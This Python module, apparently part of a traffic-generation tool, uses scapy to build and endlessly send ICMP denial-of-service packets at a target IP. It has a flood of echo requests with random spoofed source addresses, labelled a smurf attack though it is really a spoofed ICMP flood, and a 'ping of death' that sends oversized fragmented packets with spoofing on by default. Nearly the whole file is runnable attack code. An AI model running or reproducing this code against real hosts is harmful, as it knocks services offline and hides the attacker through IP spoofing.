from scapy.all import IP, ICMP, fragment, send, RandIP, RandShort
from sys import path
path.append("..")
import packet_builder

def build_smurf_packet(destination_IP):
    """Generate ICMP ECHO request with spoofed source IP address.
    
    Argument:
    destination_IP -- the IP address of the target

    """
    return IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/ICMP(id=RandShort())/packet_builder.generate_payload()

def build_ping_of_death_packet(destination_IP, IP_spoofing=True):
    """Generate ICMP ECHO request with larger than normal packet length (65,535 bytes).
    
    Arguments:
    destination_IP -- the IP address of the target
    IP_spoofing -- enable or disable source IP spoofing (default True)

    """
    if IP_spoofing:
        return fragment(IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/ICMP(id=RandShort())/(packet_builder.generate_payload(1)*65500))

    return fragment(IP(dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/ICMP(id=RandShort())/(packet_builder.generate_payload(1)*65500))

def start_smurf_flood(destination_IP):
    """Continuously send ICMP ECHO packets with spoofed source IP address"""
    try:
        while True:
            send(build_smurf_packet(destination_IP), inter=packet_builder.generate_delay_for_packet())
    except KeyboardInterrupt:
        print("...Exiting...")

def start_ping_of_death(destination_IP, IP_spoofing):
    """Continuously send fragmented ICMP ECHO packets"""
    try:
        while True:
            send(build_ping_of_death_packet(destination_IP, IP_spoofing), inter=packet_builder.generate_delay_for_packet())
    except KeyboardInterrupt:
        print("...Exiting...")